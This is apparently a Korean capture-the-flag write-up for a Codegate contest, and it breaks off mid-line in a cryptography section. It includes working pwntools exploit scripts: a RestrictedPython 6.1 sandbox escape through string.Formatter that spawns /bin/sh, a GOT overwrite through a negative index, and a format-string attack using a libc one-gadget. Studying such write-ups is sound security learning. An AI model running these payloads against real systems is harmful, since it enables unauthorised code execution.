### shielder(조수호) 

1. misc/Hello Codegate
2. misc/Captcha World
3. misc/safePythonExecutor
4. pwn/What's Happening?
5. pwn/Magic Palette
6. crypto/Encrypted flag
7. rev/inital
8. rev/C0D3Matr1x
9. web/Ping Tester

---
## misc/Hello Codegate

디코 `notice` 채널에 플래그가 나와있다.

---
## misc/Captcha World

캡챠를 입력해야 한다. 근데 10번만 하면 되기 때문에 그냥 직접 입력해주면 된다.

---
## misc/safePythonExecutor

중요한 것은 `RestrictedPython==6.1`이다. CVE를 찾아보니 format, format_map, formatter 쪽에 필터링 실패 취약점이 있다고 한다.

https://github.com/nikosChalk/ctf-writeups/blob/master/uiuctf23/pyjail/rattler-read/writeup/README.md

위의 라업 논리를 그대로 따라가면 똑같은 방법으로 풀 수 있다.

### exploit.py

```python
from pwn import *

p = remote('3.35.196.167', 42424)
#p = process(['python3', 'prob.py'])

#dt = '''string.Formatter().get_field("a.__class__.__base__.__subclasses__", [], {"a": ""})[0]()[84].load_module("os").system("sh")'''
dt = '''
class Baz(string.Formatter): pass; get_field = lambda self, field_name, args, kwargs: (string.Formatter.get_field(self, field_name, args, kwargs)[0]("/bin/sh"), ""); 
Baz().format("{0.Random.__init__.__globals__[_os].system}", random)
'''.replace('\n', '\r')
p.sendlineafter(b': ', dt)
p.send(b'\n')
p.interactive()
```

---
## pwn/What's Happening?

pie가 꺼져 있다. Partial RELRO이다. 행성 정보 업데이트를 하는데 음수 인덱스를 안 막아 놨다. 그래서 got overwrite가 된다. puts got을 win 함수로 덮으면 된다. system got이 망가지긴 하는데, pie가 꺼져 있어서 그냥 다시 입력 해주면 된다.

### exploit.py

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

#p = process('./prob')
p = remote('3.37.174.221', 33333)
e = ELF('./prob')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', b'-3')
p.sendlineafter(b': ', p64(e.sym['win']) + b'a' * 8 + p64(0x401080))
p.sendlineafter(b': ', b'0')
#gdb.attach(p)
p.sendlineafter(b': ', b'0')
p.interactive()
```

---

## pwn/Magic Palette

`print_palette`에서 입력 때 조건을 좀 맞춰주면 `FSB`가 터진다. `k`라는 바이트를 출력하고 싶으면 `k + b'\x80'`을 입력해주면 된다. `FSB`가 무제한이므로 릭은 얼마든지 할 수 있다.
원가젯은
```
0xebd38 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
```

이걸 쓰고, r12를 0으로 만들어줬다. `FSB`로 `printf` 내부 스택 프레임의 `pop r12`와 ret 부분에 덮어줘서 해결했다.

### exploit.py

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

def rp(payload : bytes):
    p.sendlineafter(b'> ', b'1')
    for i in range(len(payload)):
        p.send(payload[i:i+1] + b'\x80')
    for i in range(len(payload), 64 * 64):
        p.send(b'\x00\x60')

def mc(x : int, y : int):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'x > ', str(x).encode())
    p.sendlineafter(b'y > ', str(x).encode())

def pp():
    p.sendlineafter(b'> ', b'3')
    return p.recvline()[:-1]

#p = process('./prob')
p = remote('43.203.137.197', 54321)
l = ELF('./libc.so.6')

num = 6 + (0x7ffc25f12bc0 - 0x7ffc25f11b80) // 8
payload = f'%{num}$p%{num+9}$p'
rp(payload.encode())

msg = pp()
mainrbp = int(msg[:14].decode(), 16)
l.address = int(msg[14:28].decode(), 16) - (0x7fea359d0d90 - 0x7fea359a7000)
print(hex(mainrbp))
print(hex(l.address))

# mainrbp = 0x7ffd93f7aff0
# r12 = 0x7ffd93f79e70
# ret = 0x7ffd93f79e88

og = l.address + 0xebd38
r12 = mainrbp + (0x7ffd93f79e70 - 0x7ffd93f7aff0)
ret = mainrbp + (0x7ffd93f79e88 - 0x7ffd93f7aff0)
payload = '%17$n%18$n'
payload += f'%{(og & ((1 << 16) - 1))}c'
payload += f'%19$hn'
payload += f'%{((og >> 16) & ((1 << 16) - 1)) - (og & ((1 << 16) - 1)) + 0x10000}c'
payload += f'%20$hn'
payload += 'a' * 4
print(hex(0x28 - len(payload)))
payload = payload.encode()
payload += p64(r12)
payload += p64(r12 + 4)
payload += p64(ret)
payload += p64(ret + 2)
mc(0, 0)
rp(payload)
#gdb.attach(p, f"b* {l.address + (0x7f8ac570c734 - 0x7f8ac5695000)}")
p.sendlineafter(b'> ', b'3')
p.interactive()
```

---
## crypto/Encrypted flag

`q = nextprime(`